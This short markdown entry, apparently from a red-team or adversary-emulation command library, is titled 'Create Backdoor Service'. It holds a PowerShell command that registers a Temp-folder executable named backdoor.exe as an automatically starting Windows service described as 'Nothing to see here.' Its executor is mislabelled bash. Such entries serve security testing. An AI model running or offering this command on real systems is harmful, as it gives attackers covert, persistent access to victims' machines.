---
id: 9372c9a9-71ed-4a80-9abd-96a586eb4585
name: Create Backdoor Service
type: command
executor: bash
data: New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe"
  -Description "Nothing to see here." -StartupType Automatic
output: null
created_at: '2023-04-06T03:56:28.095200+00:00'
updated_at: '2023-04-10T20:37:29.727924+00:00'
---

# Create Backdoor Service

```bash
New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
```


